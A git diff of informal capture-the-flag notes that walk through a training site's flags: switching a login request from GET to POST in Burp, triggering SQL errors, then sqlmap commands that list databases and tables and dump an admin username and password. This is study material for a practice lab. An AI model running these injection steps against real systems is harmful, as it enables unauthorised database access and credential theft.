@@ -1,4 +1,13 @@
-### Flag 0
+###Flag1
+* Go to http://35.227.24.107/b1f0346975/page/1
+* Click edit this page http://35.227.24.107/b1f0346975/login
+* Asks to input a user name and password
+* Uses a GET Method intercept using burp and change the method to post
+* Output has the Flag in it.
+
+
+
+### Flag 2-3
 * Click on new page 
 * on the login page try using ',' for username and password
 * Exposes the database MariaDB and admin table
@@ -16,7 +25,36 @@ Content-Length: 23
 Connection: close
 Upgrade-Insecure-Requests: 1
 
-username=rr&password=ss
+username=1&password=1
 __________________________________
-*use sqlmap to discover databases: "sqlmap -r /home/kali/Test --dbs --random-agent --thread 10"
+*use sqlmap to discover databases: "sqlmap -r /home/kali/Desktop/1.txt --dbs --random-agent --thread 10"
 *once the dbs are discovered look for tables in the databases: 
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+* Check level2 DB "sqlmap -r /home/kali/Desktop/1.txt -D level2 --tables  --random-agent --thread 10"
+
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+* dump table content  "sqlmap -r /home/kali/Desktop/1.txt -D level2 -T admin  --random-agent --thread 10"
+
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | neida    | adell    |
++----+----------+----------+
+
+* Flags 2 show up in the dump
+* login with username and password Flagg 3 shows up
+
+
+
+
